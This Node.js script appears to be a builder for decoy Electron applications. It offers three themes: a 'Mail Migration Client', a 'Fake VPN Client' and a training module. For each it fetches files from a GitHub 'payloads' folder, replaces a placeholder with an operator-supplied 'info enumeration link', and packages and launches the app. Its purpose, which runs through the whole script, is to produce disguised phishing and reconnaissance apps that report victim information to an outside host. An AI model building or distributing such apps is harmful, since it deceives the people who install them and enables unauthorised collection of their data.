const fs = require('fs');
const https = require('https');
const { execSync } = require('child_process');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function main() {
    try {
        const installFolderInput = await askQuestion('What is the folder name?\n');
        fs.mkdirSync(installFolderInput.trim(), { recursive: true });
        process.chdir(installFolderInput);
	console.log("");
        console.log(`Folder created. Trying to install into: ${process.cwd()}\n`);

        execSync('npm init -y', { stdio: 'inherit' });
        console.log('npm init completed successfully.\n');

        let choice;
        do {
            choice = await askQuestion('Which theme? 1) Mail Migration Client 2) Fake VPN Client 3) Electron Training Module\n');
        } while (!(choice === '1' || choice === '2' || choice === '3'));

        await handleChoice(choice.trim());
        console.log('Theme downloaded. Continuing to the next step\n');

        // Prompt for package.json details
        const name = await askQuestion('Enter the package name:\n');
        const author = await askQuestion('Enter the author name:\n');
        const description = await askQuestion('Enter the description:\n');

        updatePackageJson(name.trim(), author.trim(), description.trim());
        execSync('npm run make', { stdio: 'inherit' });

        console.log("");
        console.log("Your shiny new app has been built. Let's test it");
        startApp();
    } catch (error) {
        console.error('Error:', error);
    } finally {
        rl.close();
    }
}

function askQuestion(question) {
    return new Promise((resolve, reject) => {
        rl.question(question, (answer) => {
            resolve(answer);
        });
    });
}

async function downloadFile(url, filename) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(filename);
        https.get(url, (response) => {
            response.pipe(file);
            file.on('finish', () => {
                file.close(resolve);
                console.log(`${filename} downloaded.`);
            });
        }).on('error', (error) => {
            fs.unlink(filename, () => {
                reject(error);
            });
        });
    });
}

async function handleChoice(choice) {
    console.log("");

    const filesForChoice = [
        'index.html',
        'styles.css',
        'index.js',
        'app.ico',
        'loading.gif'
    ];

    if (choice === '1') {
        const userLink = await askQuestion('Enter the info enumeration link for the Mail Migration Client\n');
        await replaceLinkAndDownload('migration', userLink.trim(), filesForChoice);
    } else if (choice === '2') {
        const userLink = await askQuestion('Enter the info enumeration link for the Mail Migration Client\n');
        await replaceLinkAndDownload('securityportal', userLink.trim(), filesForChoice);
    } else if (choice === '3') {
        const userLink = await askQuestion('Electron Training selected. Enter NA:\n');
        await replaceLinkAndDownload('hrportal', userLink.trim(), filesForChoice);
    } else {
        console.log("Invalid choice. Please choose again.");
        await handleChoice(await askQuestion('Which theme? 1) HR 2) Mail Migration 3) VPN Client\n'));
    }
}

async function downloadFiles(folder, files) {
    const baseURLChoice1 = 'https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/';
    const baseURLChoice2 = 'https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/';
    const baseURLChoice3 = 'https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/training/';

    let baseURL;
    if (folder === 'migration') {
        baseURL = baseURLChoice1;
    } else if (folder === 'securityportal') {
        baseURL = baseURLChoice2;
    } else if (folder === 'hrportal') {
        baseURL = baseURLChoice3;
    } else {
        throw new Error('Invalid folder provided.');
    }

    try {
        await Promise.all(
            files.map(async (file) => {
                const url = `${baseURL}${file}`;
                await downloadFile(url, file);
            })
        );
    } catch (error) {
        throw new Error(`Error downloading files: ${error.message}`);
    }
}

async function replaceLinkAndDownload(folder, userLink, files) {
    try {
        await downloadFiles(folder, files); // Download files first

        const htmlFilePath = `./${files[0]}`;
        const htmlContent = fs.readFileSync(htmlFilePath, 'utf-8');
        const replacedContent = htmlContent.replace('http://127.0.0.1', userLink);
        fs.writeFileSync(htmlFilePath, replacedContent, 'utf-8');

        console.log('Link replaced in index.html. Continuing...');
        updatePackageJson();
    } catch (error) {
        console.error('Error replacing link and downloading files:', error);
    }
}

function updatePackageJson(name, author, description) {
    try {
        let packageJson = {};

        if (fs.existsSync('package.json')) {
            const content = fs.readFileSync('package.json', 'utf8').trim();
            packageJson = content ? JSON.parse(content) : {};
        }

        packageJson.name = name || "your-app-name";
        packageJson.version = "1.0.0";
        packageJson.main = "index.js";
        packageJson.scripts = {
            "start": "electron .",
            "test": "echo \"Error: no test specified\" && exit 1",
            "package": "electron-forge package",
            "make": "electron-forge make"
        };

        packageJson.author = author || "Real Author";
        packageJson.description = description || "The app description";

        packageJson.license = "MIT";
        packageJson.devDependencies = {
            "@electron-forge/cli": "^7.0.0",
            "@electron-forge/maker-deb": "^7.0.0",
            "@electron-forge/maker-rpm": "^7.0.0",
            "@electron-forge/maker-squirrel": "^7.0.0",
            "@electron-forge/maker-zip": "^7.0.0",
            "@electron-forge/plugin-auto-unpack-natives": "^7.0.0",
            "electron": "^27.1.0"
        };
        packageJson.dependencies = {
            "electron-squirrel-startup": "^1.0.0"
        };

        fs.writeFileSync('package.json', JSON.stringify(packageJson, null, 2));
        console.log('package.json updated successfully.\n');
        console.log('Attempting Electron install..\n');
        installElectron();
    } catch (error) {
        console.error('Error reading/writing package.json:', error);
    }
}

function installElectron() {
    try {
        execSync('npm install electron --save-dev', { stdio: 'inherit' });
        execSync('npm install --save-dev @electron-forge/cli', { stdio: 'inherit' });
        execSync('npx electron-forge import', { stdio: 'inherit' });
        //execSync('npm run make', { stdio: 'inherit' });
        
    } catch (error) {
        console.error('Error installing/running Electron:', error);
    }
}

function startApp() {
    console.log("");
    console.log("Executable Created!");
    console.log("");
    console.log("Launching app test");
    execSync('npm run start', { stdio: 'inherit' });
}

main();
